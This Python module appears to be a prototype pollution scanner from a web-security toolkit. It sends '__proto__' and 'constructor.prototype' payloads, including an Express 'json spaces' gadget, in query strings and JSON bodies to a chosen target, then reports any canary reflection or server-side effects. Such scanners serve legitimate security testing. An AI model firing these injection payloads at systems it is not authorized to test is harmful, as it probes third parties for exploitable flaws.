import asyncio
import json
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

console = Console()

CANARY = "prth0spp"
CANARY_VAL = "polluted9173"

QUERY_PAYLOADS = [
    f"__proto__[{CANARY}]={CANARY_VAL}",
    f"__proto__.{CANARY}={CANARY_VAL}",
    f"constructor[prototype][{CANARY}]={CANARY_VAL}",
    f"constructor.prototype.{CANARY}={CANARY_VAL}",
]

JSON_PAYLOADS = [
    {"__proto__": {CANARY: CANARY_VAL}},
    {"constructor": {"prototype": {CANARY: CANARY_VAL}}},
    {"__proto__": {"json spaces": 8}},
]

SEVERITY_COLOR = {
    "critical": "bold red", "high": "red", "medium": "yellow", "low": "dim", "info": "cyan",
}


@dataclass
class PPFinding:
    kind:       str
    vector:     str
    payload:    str
    detail:     str
    severity:   str          = "high"

    def to_dict(self) -> dict:
        return self.__dict__.copy()


@dataclass
class PrototypePollutionReport:
    target:      str
    started_at:  str                  = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    finished_at: Optional[str]       = None
    findings:    list[PPFinding]     = field(default_factory=list)
    errors:      list[str]           = field(default_factory=list)

    @property
    def high(self) -> list[PPFinding]:
        return [f for f in self.findings if f.severity in ("critical", "high")]

    def to_dict(self) -> dict:
        d = self.__dict__.copy()
        d["findings"] = [f.to_dict() for f in self.findings]
        return d


def _add(report, kind, vector, payload, detail, severity):
    f = PPFinding(kind=kind, vector=vector, payload=payload, detail=detail, severity=severity)
    report.findings.append(f)
    _print_finding(f)


def _json_indented(text: str) -> bool:
    return bool(re.search(r"\{\n\s+\"", text)) or bool(re.search(r"^\s{2,}\"", text, re.MULTILINE))


async def _test_query(client, target, report):
    parsed = urlparse(target)
    for payload in QUERY_PAYLOADS:
        sep = "&" if parsed.query else ""
        test_url = urlunparse(parsed._replace(query=parsed.query + sep + payload))
        try:
            r = await client.get(test_url, timeout=12)
        except Exception:
            continue
        if CANARY in r.text and CANARY_VAL in r.text:
            _add(report, "Reflected pollution", "query", payload,
                 f"Canary key '{CANARY}' reflected after __proto__ injection", "high")
            return


async def _test_json(client, target, baseline_indented, report):
    for payload in JSON_PAYLOADS:
        try:
            r = await client.post(target, json=payload, timeout=12)
        except Exception:
            continue
        if "json spaces" in json.dumps(payload):
            if not baseline_indented and _json_indented(r.text) and r.headers.get("content-type", "").find("json") != -1:
                _add(report, "Server-side pollution", "json body", json.dumps(payload),
                     "Response JSON became indented after polluting 'json spaces' gadget (Express)", "high")
                return
        elif CANARY in r.text and CANARY_VAL in r.text:
            _add(report, "Reflected pollution", "json body", json.dumps(payload),
                 f"Canary key '{CANARY}' reflected after __proto__ injection", "high")
            return
        if r.status_code == 500:
            _add(report, "Pollution error", "json body", json.dumps(payload),
                 "500 triggered by __proto__ payload — possible unsafe merge", "medium")


def _print_finding(f: PPFinding):
    color = SEVERITY_COLOR.get(f.severity, "white")
    console.print(
        f"  [{color}][{f.severity.upper()}][/{color}] "
        f"[bold white]{f.kind}[/bold white] [cyan]({f.vector})[/cyan] → "
        f"[yellow]{f.detail}[/yellow]"
    )


def _display(report: PrototypePollutionReport):
    console.print()
    console.print(Panel(
        f"[bold white]{report.target}[/bold white]  "
        f"[dim]findings:[/dim] [yellow]{len(report.findings)}[/yellow]  "
        f"[dim]high:[/dim] [red]{len(report.high)}[/red]",
        title="[bold red]Prototype Pollution — Summary[/bold red]",
        border_style="red",
    ))

    if not report.findings:
        console.print("[dim]    No prototype pollution found.[/dim]\n")
        return

    table = Table(show_header=True, header_style="bold red", border_style="dim")
    table.add_column("Severity", width=10)
    table.add_column("Kind",     style="cyan", width=22)
    table.add_column("Vector",   style="magenta", width=12)
    table.add_column("Detail",   style="yellow", min_width=30)

    for f in report.findings:
        color = SEVERITY_COLOR.get(f.severity, "white")
        table.add_row(f"[{color}]{f.severity}[/{color}]", f.kind, f.vector, f.detail[:45])

    console.print(table)
    console.print()


async def _pp_async(target, proxy) -> PrototypePollutionReport:
    report = PrototypePollutionReport(target=target)

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True, proxy=proxy,
        headers={"User-Agent": "Mozilla/5.0 (compatible; Prothos/1.0)"},
    ) as client:
        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[bold white]{task.description}"),
            TimeElapsedColumn(),
            console=console, transient=True,
        ) as progress:
            progress.add_task("Testing prototype pollution...", total=None)
            baseline_indented = False
            try:
                base = await client.get(target, timeout=12)
                baseline_indented = _json_indented(base.text)
            except Exception as e:
                report.errors.append(str(e)[:100])
            await _test_query(client, target, report)
            await _test_json(client, target, baseline_indented, report)

    report.finished_at = datetime.now(timezone.utc).isoformat()
    return report


def run_prototype_pollution(
    target:      str,
    proxy:       Optional[str]  = None,
    save_json:   Optional[str]  = None,
) -> PrototypePollutionReport:

    console.print(f"\n[bold red][*][/bold red] Prototype Pollution → [bold white]{target}[/bold white]")

    report = asyncio.run(_pp_async(target, proxy))
    _display(report)

    if save_json:
        try:
            with open(save_json, "w", encoding="utf-8") as f:
                json.dump(report.to_dict(), f, indent=2, default=str)
            console.print(f"[dim][+] Saved to {save_json}[/dim]")
        except OSError as e:
            console.print(f"[red][!] Failed to save: {e}[/red]")

    return report
